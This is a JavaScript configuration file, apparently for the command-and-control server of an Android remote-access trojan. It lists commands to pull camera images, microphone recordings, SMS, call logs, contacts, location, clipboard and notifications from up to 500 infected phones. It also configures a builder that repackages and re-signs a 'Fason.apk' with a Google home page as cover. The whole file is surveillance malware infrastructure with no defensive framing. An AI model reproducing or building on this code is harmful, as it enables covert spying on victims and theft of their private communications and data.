const path = require('path');

// Main config
const config = {
    // Server
    port: 22533,
    debug: false,

    // Data paths
    dbPath: path.join(__dirname, '../../data'),
    downloadsPath: path.join(__dirname, '../../data/clients/downloads'),
    photosPath: path.join(__dirname, '../../data/clients/photos'),
    recordingsPath: path.join(__dirname, '../../data/clients/recordings'),

    // Message codes
    msg: {
        camera: '0xCA',
        files: '0xFI',
        calls: '0xCL',
        sms: '0xSM',
        mic: '0xMI',
        location: '0xLO',
        contacts: '0xCO',
        wifi: '0xWI',
        notification: '0xNO',
        clipboard: '0xCB',
        apps: '0xIN',
        permissions: '0xPM',
        checkPerm: '0xGP',
        fasonManager: '0xFM',
        deviceInfo: '0xIF'
    },

    // Limits
    limits: {
        maxClients: 500,
        maxDownloads: 100,
        maxPhotos: 100,
        maxRecordings: 100,
        maxGpsHistory: 100,
        maxSmsHistory: 250,
        maxCallsHistory: 250,
        maxNotifications: 200,
        maxClipboardHistory: 200,
        maxFileSize: 50 * 1024 * 1024
    },

    // Socket
    socket: {
        pingInterval: 25000,
        pingTimeout: 60000,
        maxHttpBufferSize: 50e6,
        transports: ['websocket', 'polling'],
        cors: { origin: '*', methods: ['GET', 'POST'] }
    },

    // Rate limit
    rateLimit: {
        windowMs: 60000,
        maxRequests: 100
    },

    // APK build
    build: {
        timeout: 600000,
        defaultUrl: 'http://127.0.0.1:22533',
        defaultHome: 'https://google.com',
        apkToolPath: path.join(__dirname, '../../app/factory/apktool.jar'),
        signerPath: path.join(__dirname, '../../app/factory/uber-apk-signer.jar'),
        baseApkPath: path.join(__dirname, '../../app/factory/baseApp/Fason.apk'),
        decompilePath: path.join(__dirname, '../../app/factory/decompiled')
    },

    // Dynamic paths
    getProgressFile() { return path.join(this.dbPath, 'build_progress.json'); },
    getBuiltApkPath() { return path.join(this.dbPath, 'built_apks'); },
    getOutputApk() { return path.join(this.getBuiltApkPath(), 'build.apk'); },
    getSignedApkName() { return 'Fason.apk'; },
    getSignedApk() { return path.join(this.getBuiltApkPath(), this.getSignedApkName()); },

    // Security
    security: {
        sessionTimeout: 24 * 60 * 60 * 1000,
        loginAttempts: 5,
        loginLockout: 15 * 60 * 1000
    }
};

module.exports = config;